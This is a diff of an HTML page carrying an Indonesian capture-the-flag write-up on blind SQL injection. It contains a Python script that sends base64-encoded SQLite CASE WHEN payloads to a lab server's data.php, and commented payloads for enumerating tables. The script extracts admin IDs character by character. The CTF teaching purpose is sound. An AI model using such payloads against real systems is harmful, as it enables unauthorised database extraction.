@@ -35,14 +35,15 @@ Yaitu pada **data.php **dan kita bisa memasukkan inputan pada parameter id denga
 <meta itemprop="name" content="WriteUp SQLi BTP - Lorem Ipsum (300)">
 <meta itemprop="description" content="Terdapat sebuah web yang sekilas terlihat biasa saja, namun saat kita memcoba mengakses hyperlink, ternyata menggunakan ajax. Sampai disini kita curiga bahwa terdapat vuln SQLi pada url api yang menggunakan ajax, sehingga dengan menggunakan HTTP Trace kita dapat mengetahui url api nya.
 Yaitu pada **data.php **dan kita bisa memasukkan inputan pada parameter id dengan metode post, namun inputan harus dalam bentuk base64. Lalu kita coba kirimkan sebuah payload ke url tsb:">
-<meta itemprop="datePublished" content="2018-07-24T14:30:19&#43;00:00" />
-<meta itemprop="dateModified" content="2018-07-24T14:30:19&#43;00:00" />
-<meta itemprop="wordCount" content="352">
+<meta itemprop="datePublished" content="2018-07-24T14:30:19+00:00" />
+<meta itemprop="dateModified" content="2018-07-24T14:30:19+00:00" />
+<meta itemprop="wordCount" content="353">
 <meta itemprop="image" content="https://cacadosman.com/"/>
 
 
 
-<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary_large_image"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://cacadosman.com/"/>
 
 <meta name="twitter:title" content="WriteUp SQLi BTP - Lorem Ipsum (300)"/>
@@ -140,20 +141,20 @@ Setelah kita analisa ternyata menggunakan SQLite dan query union ternyata difilt
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> requests <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#f92672">import</span> base64
 
-url <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">http://35.187.236.126:8013/data.php</span><span style="color:#e6db74">&#34;</span>
-charlist <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">abcdefghijklmnopqrstuvwxyz1234567890 _,)(:}{</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://35.187.236.126:8013/data.php&#34;</span>
+charlist <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyz1234567890 _,)(:}{</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
 temp <span style="color:#f92672">=</span> []
 <span style="color:#66d9ef">while</span>(True):
-   temp <span style="color:#f92672">+</span><span style="color:#f92672">=</span> [<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span>]
+   temp <span style="color:#f92672">+=</span> [<span style="color:#e6db74">&#34;a&#34;</span>]
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(charlist)):
        temp[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> charlist[i]
-       res <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>join(temp)
-       <span style="color:#75715e">#payload = &#34;(select CASE WHEN (SELECT group_concat(tbl_name,&#39;:&#39;) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;) like &#39;&#34; + res + &#34;%&#39; THEN 1 ELSE 0 END)&#34;</span>
-       <span style="color:#75715e">#payload = &#34;(select CASE WHEN (SELECT sql FROM sqlite_master WHERE type!=&#39;meta&#39; AND sql NOT NULL AND name NOT LIKE &#39;sqlite_%&#39;) like &#39;&#34; + res + &#34;%&#39; THEN 1 ELSE 0 END)&#34;</span>
-       payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">(select CASE WHEN (select group_concat(admin_id) from n1mbusadmin) like </span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> res <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74"> THEN 1 ELSE 0 END)</span><span style="color:#e6db74">&#34;</span>
+       res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(temp)
+       <span style="color:#75715e">#payload = &#34;(select CASE WHEN (SELECT group_concat(tbl_name,&#39;:&#39;) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;) like &#39;&#34; + res + &#34;%&#39; THEN 1 ELSE 0 END)&#34;</span>
+       <span style="color:#75715e">#payload = &#34;(select CASE WHEN (SELECT sql FROM sqlite_master WHERE type!=&#39;meta&#39; AND sql NOT NULL AND name NOT LIKE &#39;sqlite_%&#39;) like &#39;&#34; + res + &#34;%&#39; THEN 1 ELSE 0 END)&#34;</span>
+       payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;(select CASE WHEN (select group_concat(admin_id) from n1mbusadmin) like &#39;&#34;</span> <span style="color:#f92672">+</span> res <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;%&#39; THEN 1 ELSE 0 END)&#34;</span>
        p64 <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(payload)
-       r <span style="color:#f92672">=</span> post(url, data<span style="color:#f92672">=</span>{<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">id</span><span style="color:#e6db74">&#34;</span>:p64})
-       <span style="color:#66d9ef">if</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Lorem Ipsum</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
+       r <span style="color:#f92672">=</span> post(url, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;id&#34;</span>:p64})
+       <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Lorem Ipsum&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
            <span style="color:#66d9ef">print</span> res
            <span style="color:#66d9ef">break</span>
        <span style="color:#66d9ef">else</span>:
